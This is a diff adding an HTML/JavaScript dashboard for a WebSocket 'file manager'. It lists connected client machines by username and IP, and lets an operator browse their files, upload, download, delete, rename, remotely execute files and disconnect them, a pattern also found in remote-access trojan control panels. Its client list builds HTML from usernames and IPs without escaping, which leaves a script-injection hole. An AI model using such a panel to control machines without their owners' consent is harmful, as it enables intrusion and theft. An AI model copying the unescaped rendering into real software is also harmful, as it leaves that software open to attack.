@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WebSocket File Manager - Dashboard</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; background: #1a1a2e; color: #e0e0e0; height: 100vh; display: flex; }
+#sidebar { width: 20%; min-width: 240px; max-width: 320px; background: #16213e; border-right: 2px solid #0f3460; display: flex; flex-direction: column; overflow: hidden; }
+#sidebar-header { padding: 16px; background: #0f3460; font-size: 18px; font-weight: bold; text-align: center; border-bottom: 2px solid #e94560; }
+#sidebar-header .dot { color: #e94560; }
+#user-count { font-size: 13px; color: #a0a0c0; margin-top: 4px; }
+#user-list { flex: 1; overflow-y: auto; padding: 8px; }
+.user-card { padding: 10px 12px; margin-bottom: 6px; border-radius: 6px; background: #1a1a3e; cursor: pointer; transition: all 0.2s; border-left: 3px solid transparent; }
+.user-card:hover { background: #252550; }
+.user-card.selected { background: #252560; border-left-color: #e94560; }
+.user-card .uname { font-weight: 600; font-size: 14px; }
+.user-card .uip { font-size: 11px; color: #888; margin-top: 2px; }
+.user-card .ustate { font-size: 10px; margin-top: 3px; }
+.user-card .ustate.online { color: #4ecca3; }
+.user-card .ustate.offline { color: #e94560; }
+#content { width: 80%; display: flex; flex-direction: column; }
+#toolbar { padding: 12px 16px; background: #16213e; border-bottom: 1px solid #0f3460; display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
+#toolbar .path-bar { flex: 1; background: #0d0d2b; border: 1px solid #333; padding: 8px 12px; border-radius: 4px; font-family: monospace; font-size: 13px; color: #4ecca3; min-width: 200px; }
+#toolbar button { padding: 8px 14px; border: none; border-radius: 4px; cursor: pointer; font-weight: 600; font-size: 12px; transition: 0.2s; }
+#toolbar button:hover { opacity: 0.85; }
+.btn-refresh { background: #0f3460; color: #fff; }
+.btn-upload { background: #4ecca3; color: #111; }
+.btn-mkdir { background: #e9c46a; color: #111; }
+.btn-download { background: #06d6a0; color: #111; }
+.btn-delete { background: #e94560; color: #fff; }
+.btn-rename { background: #6c63ff; color: #fff; }
+.btn-exec { background: #f72585; color: #fff; }
+.btn-disconnect { background: #555; color: #fff; }
+#file-area { flex: 1; overflow-y: auto; padding: 8px; }
+.file-table { width: 100%; border-collapse: collapse; }
+.file-table th { text-align: left; padding: 10px 12px; font-size: 12px; color: #888; border-bottom: 2px solid #333; position: sticky; top: 0; background: #1a1a2e; }
+.file-table td { padding: 8px 12px; font-size: 13px; border-bottom: 1px solid #252540; }
+.file-table tr:hover { background: #252550; cursor: pointer; }
+.file-table tr.selected { background: #2e3260; }
+.file-table .dir { color: #4ecca3; font-weight: 600; }
+.file-table .file { color: #ccc; }
+.file-size { color: #888; font-size: 11px; text-align: right; }
+.file-date { color: #666; font-size: 11px; }
+#status-bar { padding: 8px 16px; background: #0f3460; font-size: 12px; display: flex; justify-content: space-between; }
+#status-bar .status-text { color: #4ecca3; }
+#status-bar .selected-user { color: #e94560; font-weight: 600; }
+#upload-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); justify-content: center; align-items: center; z-index: 1000; }
+#upload-modal.show { display: flex; }
+#upload-modal .modal-box { background: #16213e; padding: 24px; border-radius: 8px; min-width: 360px; border: 1px solid #333; }
+#upload-modal input[type=text] { width: 100%; padding: 8px; margin: 8px 0; border-radius: 4px; border: 1px solid #444; background: #0d0d2b; color: #fff; }
+#upload-modal button { padding: 8px 16px; margin: 4px; border: none; border-radius: 4px; cursor: pointer; font-weight: 600; }
+#upload-modal .btn-ok { background: #4ecca3; color: #111; }
+#upload-modal .btn-cancel { background: #555; color: #fff; }
+.toast { position: fixed; bottom: 20px; right: 20px; padding: 12px 20px; border-radius: 6px; color: #fff; font-size: 13px; z-index: 9999; animation: fadeIn 0.3s, fadeOut 0.3s 2.7s; pointer-events: none; }
+.toast.success { background: #4ecca3; color: #111; }
+.toast.error { background: #e94560; }
+.toast.info { background: #0f3460; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+@keyframes fadeOut { from { opacity: 1; } to { opacity: 0; } }
+</style>
+</head>
+<body>
+
+<div id="sidebar">
+  <div id="sidebar-header"><span class="dot">⬤</span> CLIENTS<div id="user-count">0 connected</div></div>
+  <div id="user-list"></div>
+</div>
+
+<div id="content">
+  <div id="toolbar">
+    <span class="path-bar" id="current-path">My Computer</span>
+    <button class="btn-refresh" onclick="refreshList()">↻ Refresh</button>
+    <button class="btn-upload" onclick="showUpload()">⬆ Upload</button>
+    <button class="btn-download" onclick="downloadSelected()">⬇ Download</button>
+    <button class="btn-mkdir" onclick="promptMkdir()">📁 New Folder</button>
+    <button class="btn-delete" onclick="promptDelete()">🗑 Delete</button>
+    <button class="btn-rename" onclick="promptRename()">✏ Rename</button>
+    <button class="btn-exec" onclick="promptExec()">▶ Execute</button>
+    <button class="btn-disconnect" onclick="disconnectClient()">✕ Disconnect</button>
+  </div>
+  <div id="file-area">
+    <table class="file-table">
+      <thead><tr><th>Name</th><th style="width:100px">Size</th><th style="width:160px">Modified</th></tr></thead>
+      <tbody id="file-list"></tbody>
+    </table>
+    <div id="no-selection" style="text-align:center;padding:60px;color:#555;">
+      <div style="font-size:48px;">📂</div>
+      <div style="margin-top:12px;">Select a client from the sidebar to manage their files</div>
+    </div>
+  </div>
+  <div id="status-bar">
+    <span class="status-text" id="status-text">Ready</span>
+    <span class="selected-user" id="selected-user">No client selected</span>
+  </div>
+</div>
+
+<div id="upload-modal">
+  <div class="modal-box">
+    <h3>Upload File</h3>
+    <input type="text" id="upload-path" placeholder="Full path to upload (remote path)"><br>
+    <input type="file" id="upload-file"><br>
+    <button class="btn-ok" onclick="doUpload()">Upload</button>
+    <button class="btn-cancel" onclick="hideUpload()">Cancel</button>
+  </div>
+</div>
+
+<script>
+const ws = new WebSocket('ws://' + location.host + '/');
+ws.binaryType = 'arraybuffer';
+let selectedUser = null;
+let currentPath = '';
+let allClients = [];
+let selectedItem = null;
+let lastItems = [];
+let activeDownload = {
+  active: false,
+  fileName: '',
+  size: 0,
+  received: 0,
+  chunks: []
+};
+
+ws.onopen = () => { ws.send(JSON.stringify({ type: 'DASHBOARD' })); setStatus('Connected'); };
+ws.onclose = () => setStatus('Disconnected - refresh page');
+
+ws.onmessage = (e) => {
+  if (typeof e.data !== 'string') {
+    handleBinaryFrame(e.data);
+    return;
+  }
+
+  try {
+    const msg = JSON.parse(e.data);
+    switch (msg.type) {
+      case 'CLIENT_LIST': allClients = msg.clients || []; renderClientList(); break;
+      case 'LIST_RES': cacheAndRender(msg.items || []); break;
+      case 'SUCCESS': toast(msg.payload, 'success'); refreshList(); break;
+      case 'ERROR': toast(msg.payload, 'error'); break;
+      case 'FILE_INFO': beginDownload(msg.payload); break;
+      case 'TRANSFER_COMPLETE': finishDownload(msg.payload); toast(msg.payload || 'Transfer complete', 'success'); break;
+      case 'UPLOAD_COMPLETE': toast('Uploaded to: ' + msg.payload, 'success'); break;
+      default: break;
+    }
+  } catch (err) {}
+};
+
+function renderClientList() {
+  const list = document.getElementById('user-list');
+  const count = document.getElementById('user-count');
+  const online = allClients.filter(c => c.state === 'connected').length;
+  count.textContent = online + ' connected / ' + allClients.length + ' total';
+  list.innerHTML = allClients.map(c => {
+    const sel = selectedUser === c.username ? ' selected' : '';
+    const sc = c.state === 'connected' ? 'online' : 'offline';
+    const si = c.state === 'connected' ? '⬤' : '◌';
+    return '<div class="user-card' + sel + '" onclick="selectUser(\'' + c.username + '\')"><div class="uname">' + si + ' ' + c.username + '</div><div class="uip">' + c.ip + '</div><div class="ustate ' + sc + '">' + c.state.toUpperCase() + '</div></div>';
+  }).join('');
+  if (allClients.length === 0) list.innerHTML = '<div style="text-align:center;padding:20px;color:#555;">No clients connected</div>';
+}
+
+function selectUser(username) {
+  selectedUser = username; currentPath = '';
+  selectedItem = null;
+  document.getElementById('current-path').textContent = 'My Computer';
+  document.getElementById('selected-user').textContent = username;
+  document.getElementById('no-selection').style.display = 'none';
+  renderClientList(); refreshList();
+}
+
+function sendCommand(cmd) {
+  if (!selectedUser) { toast('Select a client first', 'error'); return; }
+  ws.send(JSON.stringify({ type: 'DASH_CMD', target: selectedUser, command: cmd }));
+  setStatus('Sent: ' + cmd.type);
+}
+
+function cacheAndRender(items) {
+  lastItems = items || [];
+  renderFileList(lastItems);
+}
+
+function refreshList() { if (selectedUser) sendCommand({ type: 'LIST', path: currentPath }); }
+
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'Backspace') {
+    if (!selectedUser) return;
+    navigateUp();
+    e.preventDefault();
+    return;
+  }
+
+  if (e.key === 'Enter') {
+    if (!selectedItem) return;
+
+    if (selectedItem.type === 'dir') {
+      setPath(selectedItem.path);
+    } else {
+      downloadSelected();
+    }
+
+    e.preventDefault();
+  }
+});
+
+function renderFileList(items) {
+  lastItems = items || [];
+  const tbody = document.getElementById('file-list');
+  document.getElementById('no-selection').style.display = 'none';
+
+  if (selectedItem && selectedItem.path && !(items || []).some(i => i.path === selectedItem.path)) {
+    selectedItem = null;
+  }
+
+  items.sort((a, b) => {
+    if (a.type !== b.type) return a.type === 'dir' ? -1 : 1;
+    return a.name.localeCompare(b.name);
+  });
+
+  tbody.innerHTML = items.map((item, index) => {
+    const icon = item.type === 'dir' ? '📁' : '📄';
+    const baseCls = item.type === 'dir' ? 'dir' : 'file';
+    const isSelected = selectedItem && selectedItem.path === item.path ? ' selected' : '';
+    const size = item.type === 'dir' ? '-' : formatSize(item.size);
+    return '<tr class="' + baseCls + isSelected + '" data-item-index="' + index + '">' +
+      '<td>' + icon + ' ' + escapeHtml(item.name) + '</td>' +
+      '<td class="file-size">' + size + '</td>' +
+      '<td class="file-date">' + (item.modified || '') + '</td>' +
+    '</tr>';
+  }).join('');
+
+  Array.from(tbody.querySelectorAll('tr[data-item-index]')).forEach(row => {
+    const idx = parseInt(row.getAttribute('data-item-index') || '-1', 10);
+    const item = lastItems[idx] || {};
+    const path = item.path || '';
+    const name = item.name || '';
+    const type = item.type || '';
+
+    row.onclick = () => {
+      if (type === 'dir') {
+        openItem(path, name, type);
+      } else {
+        selectItem(path, name, type);
+      }
+    };
+
+    row.ondblclick = () => {
+      openItem(path, name, type);
+    };
+  });
+
+  if (currentPath) {
+    tbody.insertAdjacentHTML('afterbegin', '<tr class="dir" onclick="navigateUp()"><td>📂 ..</td><td class="file-size">-</td><td class="file-date"></td></tr>');
+  }
+}
+
+function navigateTo(p) { setPath(p); }
+function navigateUp() { setPath(getParentPath(currentPath)); }
+function setPath(p) {
+  currentPath = (p || '').trim();
+  document.getElementById('current-path').textContent = currentPath || 'My Computer';
+  selectedItem = null;
+  refreshList();
+}
+function selectItem(p, n, t) {
+  selectedItem = { path: p, name: n, type: t };
+  renderFileList(lastItems);
+  setStatus('Selected: ' + n);
+}
+function openItem(p, n, t) {
+  selectedItem = { path: p, name: n, type: t };
+  renderFileList(lastItems);
+
+  if (t === 'dir') {
+    setPath(p);
+    return;
+  }
+  toast('Double-click is disabled for files. Use the Download button.', 'info');
+}
+function getParentPath(path) {
+  const current = (path || '').trim();
+  if (!current) return '';
+
+  const normalized = current.replace(/\//g, '\\');
+  const trimPath = normalized.endsWith('\\') ? normalized.slice(0, -1) : normalized;
+
+  if (/^[A-Za-z]:$/.test(trimPath)) return '';
+  if (/^[A-Za-z]:\\?$/.test(trimPath)) return '';
+
+  const separatorIndex = trimPath.lastIndexOf('\\');
+  if (separatorIndex <= 0) return '';
+
+  if (separatorIndex === 2 && /^[A-Za-z]:/.test(trimPath)) {
+    return trimPath.slice(0, 3);
+  }
+
+  return trimPath.slice(0, separatorIndex);
+}
+function downloadSelected() {
+  if (!selectedItem || selectedItem.type !== 'file') {
+    toast('Select a file first', 'error');
+    return;
+  }
+  sendCommand({ type: 'DOWNLOAD', path: selectedItem.path });
+  toast('Download: ' + selectedItem.name, 'info');
+}
+function promptDelete() {
+  if (!selectedUser) return;
+  const fallback = selectedItem ? selectedItem.path : currentPath;
+  const p = prompt('Full path to delete:', fallback || '');
+  if (p) sendCommand({ type: 'DELETE', path: p });
+}
+function promptMkdir() { if (!selectedUser) return; const n = prompt('Folder name:'); if (n) { const f = currentPath ? currentPath + '\\' + n : n; sendCommand({ type: 'MKDIR', path: f }); } }
+function promptRename() {
+  if (!selectedUser) return;
+  const defaultPath = selectedItem ? selectedItem.path : '';
+  const o = prompt('Current full path:', defaultPath);
+  if (!o) return;
+  const n = prompt('New full path:', o);
+  if (n) sendCommand({ type: 'RENAME', old: o, new: n });
+}
+function promptExec() {
+  if (!selectedUser) return;
+  const p = prompt('Full path to execute:', selectedItem ? selectedItem.path : '');
+  if (p) sendCommand({ type: 'EXEC', path: p });
+}
+function disconnectClient() { if (!selectedUser) return; sendCommand({ type: 'DISCONNECT' }); toast('Disconnect sent', 'info'); }
+function showUpload() { if (!selectedUser) { toast('Select a client first', 'error'); return; } document.getElementById('upload-modal').classList.add('show'); document.getElementById('upload-path').value = currentPath ? currentPath + '\\' : ''; }
+function hideUpload() { document.getElementById('upload-modal').classList.remove('show'); }
+function doUpload() {
+  const file = document.getElementById('upload-file').files[0];
+  if (!file) { toast('Select a file', 'error'); return; }
+  const rawPath = document.getElementById('upload-path').value || '';
+  const uploadPath = resolveUploadPath(rawPath, file.name);
+  sendCommand({ type: 'UPLOAD_START', path: uploadPath, filename: file.name, size: file.size.toString() });
+  const reader = new FileReader();
+  reader.onload = () => { ws.send(reader.result); toast('Upload: ' + file.name, 'info'); };
+  reader.readAsArrayBuffer(file); hideUpload();
+}
+
+function beginDownload(infoPayload) {
+  const info = safeParseJson(infoPayload) || {};
+  activeDownload = {
+    active: true,
+    fileName: info.name || 'download.bin',
+    size: Number(info.size || 0),
+    received: 0,
+    chunks: []
+  };
+  setStatus('Downloading: ' + activeDownload.fileName);
+}
+
+function handleBinaryFrame(data) {
+  if (!activeDownload.active) return;
+  const bytes = data instanceof ArrayBuffer ? data : null;
+  if (!bytes) return;
+  activeDownload.chunks.push(bytes);
+  activeDownload.received += bytes.byteLength || 0;
+  setStatus('Downloading: ' + activeDownload.fileName + ' (' + activeDownload.received + (activeDownload.size ? '/' + activeDownload.size : '') + ' bytes)');
+}
+
+function finishDownload(msg) {
+  if (!activeDownload.active) return;
+  const blob = new Blob(activeDownload.chunks, { type: 'application/octet-stream' });
+  const url = URL.createObjectURL(blob);
+  const anchor = document.createElement('a');
+  anchor.href = url;
+  anchor.download = activeDownload.fileName || 'download.bin';
+  document.body.appendChild(anchor);
+  anchor.click();
+  document.body.removeChild(anchor);
+  URL.revokeObjectURL(url);
+  setStatus('Download complete: ' + activeDownload.fileName);
+  activeDownload = { active: false, fileName: '', size: 0, received: 0, chunks: [] };
+}
+
+function resolveUploadPath(path, filename) {
+  const p = (path || '').trim();
+  if (!p) return filename;
+  if (/[\\/]$/.test(p)) return p + filename;
+  const last = p.split(/[\\/]/).pop() || '';
+  if (!last.includes('.')) return p + '\\' + filename;
+  return p;
+}
+
+function safeParseJson(text) {
+  try { return text ? JSON.parse(text) : null; } catch (e) { return null; }
+}
+function formatSize(bytes) { if (bytes < 1024) return bytes + ' B'; if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB'; if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + ' MB'; return (bytes / 1073741824).toFixed(1) + ' GB'; }
+function escapeHtml(value) {
+  if (value === null || value === undefined) return '';
+  return String(value)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/\"/g, '&quot;');
+}
+function setStatus(t) { document.getElementById('status-text').textContent = t; }
+function toast(text, type) { const el = document.createElement('div'); el.className = 'toast ' + (type || 'info'); el.textContent = text; document.body.appendChild(el); setTimeout(() => el.remove(), 3000); }
+</script>
+</body>
+</html>
